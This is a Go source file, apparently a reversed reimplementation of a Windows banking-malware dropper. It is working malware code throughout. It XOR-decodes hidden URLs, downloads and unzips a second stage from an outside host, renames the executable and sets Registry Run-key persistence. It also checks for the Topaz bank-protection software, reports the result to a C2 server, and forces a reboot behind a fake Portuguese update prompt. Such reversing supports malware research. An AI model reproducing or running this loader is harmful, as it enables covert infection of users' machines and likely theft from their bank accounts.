/*
Reference: https://x.com/P4nd3m1cb0y/status/1809013595029582256
Original Sample: 4e2719f310a99893258f5727ef7ec340f70ede74dfad581da73358ef429b5fd9
Reversed by @P4nd3m1cb0y
*/

package main

import (
	"archive/zip"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

var (
	user32dll      = syscall.NewLazyDLL("user32.dll")
	procMessagebox = user32dll.NewProc("MessageBoxW")
)

const (
	MB_OK = 0x00000000
)

// Get environment variable: (HOMEDRIVE, HOMEDIR, and WINDIR)
func userHomeDir() (string, string) {
	return os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH"), os.Getenv("WINDIR")
}

// Create a sequence of random characters to use as the file name
func genRandomStr(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

	seedRand := rand.New(rand.NewSource((time.Now().UnixNano())))
	buff := make([]byte, length)

	for i := range buff {
		buff[i] = charset[seedRand.Intn(len(charset))]
	}
	return string(buff)
}

// Decodes the payload data
func b64decodeXor(key string, b64text string) ([]byte, error) {
	decoded, err := base64.StdEncoding.DecodeString(b64text)
	if err != nil {
		return nil, err
	}

	bKey := []byte(key)
	keyLen := len(bKey)

	for i := range decoded {
		decoded[i] ^= bKey[i%keyLen]
	}

	return decoded, nil
}

// Downloads the second stage of the malware
func downloadZipFile(url string, dest_path string) {
	resp, err := http.Get(url)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("\n[+] Response Status: ", resp.Status)

	file, err := os.OpenFile(dest_path, os.O_CREATE|os.O_RDWR, 578)
	if err != nil {
		log.Fatal(err)
	}

	buff := make([]byte, 1024)
	io.CopyBuffer(file, resp.Body, buff)
	defer file.Close()
}

// Restart message
func MessageBoxW(hwnd uintptr, caption, title string, flags uint) int {
	captionPtr, _ := syscall.UTF16PtrFromString(caption)
	titlePtr, _ := syscall.UTF16PtrFromString(title)
	ret, _, _ := procMessagebox.Call(
		hwnd,
		uintptr(unsafe.Pointer(captionPtr)),
		uintptr(unsafe.Pointer(titlePtr)),
		uintptr(flags),
	)
	return int(ret)
}

// Reboot the target computer
func restartComputer() {
	MessageBoxW(0, "O computador será reiniciado em 90 segundos para completar as atualizações", "Reinicialização Programada", MB_OK)
	cmd := exec.Command("shutdown", "/r", "/t", "90")
	cmd.Run()
}

// Unzip the content from the downloaded zip file
func unZipFile(target_file string, dest_dir string) {
	read_file, err := zip.OpenReader(target_file)
	if err != nil {
		log.Fatal(err)
	}
	defer read_file.Close()

	for _, file := range read_file.File {
		new_file := filepath.Join(dest_dir, file.Name)

		if file.FileInfo().IsDir() {
			err := os.MkdirAll(new_file, file.Mode())
			if err != nil {
				log.Fatal(err)
			}
		} else {
			err := os.MkdirAll(filepath.Dir(new_file), file.Mode())
			if err != nil {
				log.Fatal(err)
			}
			zip_file, err := file.Open()
			if err != nil {
				log.Fatal(err)
			}
			defer zip_file.Close()

			dest_file, err := os.OpenFile(new_file, os.O_CREATE|os.O_RDWR, file.Mode())
			if err != nil {
				log.Fatal(err)
			}
			defer dest_file.Close()

			buff := make([]byte, 1024)
			_, err = io.CopyBuffer(dest_file, zip_file, buff)
			if err != nil {
				log.Fatal(err)
			}
		}
	}
	restartComputer()
}

// Rename legitime .exe file
func rename_exe(target_dir string) string {
	files, err := os.ReadDir(target_dir)
	if err != nil {
		log.Fatal(err)
	}

	new_name := filepath.Join(target_dir, fmt.Sprintf("%s.exe", genRandomStr(10)))

	for _, file := range files {
		if strings.Contains(file.Name(), ".exe") {
			old_name := filepath.Join(target_dir, file.Name())
			os.Rename(old_name, new_name)
		}
	}
	return new_name
}

func setPersistence(path_regkey string, value string) {
	hKey, err := registry.OpenKey(registry.CURRENT_USER, path_regkey, registry.SET_VALUE)
	if err != nil {
		log.Fatal(err)
	}

	err = registry.Key.SetStringValue(hKey, genRandomStr(10), value)
	if err != nil {
		log.Fatal(err)
	}
}

func checkTopaz(topaz_path string) string {
	_, err := os.Stat(topaz_path)
	if err != nil {
		return "N"
	}
	return "S"
}

func sendTargetStatus(url string, status string) {
	resp, err := http.Get(url + status)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("\n[!] C2 Status: %s", resp.Status)
}

func main() {
	const xor_key = "psdql"

	env_userhomepath, env_windir := userHomeDir()
	fmt.Printf("[+] UserDir: %s\n[+] Windir: %s", env_userhomepath, env_windir)

	path_ms_assembly := filepath.Join(env_userhomepath, "Microsoft.NET", "assembly")
	path_ms_assembly_tangeu := filepath.Join(path_ms_assembly, "tangeu")
	err := os.MkdirAll(path_ms_assembly, 493)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("\n[+] Malware path created: %s", path_ms_assembly)
	fmt.Printf("\n[+] Path to tangeu: %s", path_ms_assembly_tangeu)

	path_mal_zip := filepath.Join(path_ms_assembly, fmt.Sprintf("%s.zip", genRandomStr(10)))
	fmt.Printf("\n[+] Zip file: %s", path_mal_zip)

	url_2_stage, _ := b64decodeXor(xor_key, "GAcQAR9KXEsGGwddBx4BFQEHGAMZFwEQABkJBRUDXhALHEMHHBYVQgoaFA==")
	path_2_topaz, _ := b64decodeXor(xor_key, "M0k4IR4fFBYQAVA1DR0JAy8wHhwRCUQ+KjQvMxAeAxIT")
	url_c2, _ := b64decodeXor(xor_key, "GAcQAVZfXAceARUBBxgDAhYSHgAFEAUeQhMcCV4CHwUFXg8RHgEDDV4DDAFTAh8cTA==")
	path_regkey_currentverionrun, _ := b64decodeXor(xor_key, "IxwCBRsRAQEtIRkQFh4fHxUQLTsZHQAeGwMvJwQeAhYKBToVARcYAx4vNgQC")
	fmt.Printf("\n[!] XORed Second stage url: %s", url_2_stage)
	fmt.Printf("\n[!] XORed Path to Topaz: %s", path_2_topaz)
	fmt.Printf("\n[!] XORed C2 url: %s", url_c2)
	fmt.Printf("\n[!] XORed Registry Key CurrentVersion\\Run: %s", path_regkey_currentverionrun)

	downloadZipFile(string(url_2_stage), path_mal_zip)
	unZipFile(path_mal_zip, path_ms_assembly_tangeu)
	renamed_file := rename_exe(path_ms_assembly_tangeu)
	fmt.Printf("[+] Renamed file: %s", renamed_file)
	setPersistence(string(path_regkey_currentverionrun), renamed_file)
	status := checkTopaz(string(path_2_topaz))
	fmt.Printf("\n[!] Result: %s", status)
	sendTargetStatus(string(url_c2), status)
}
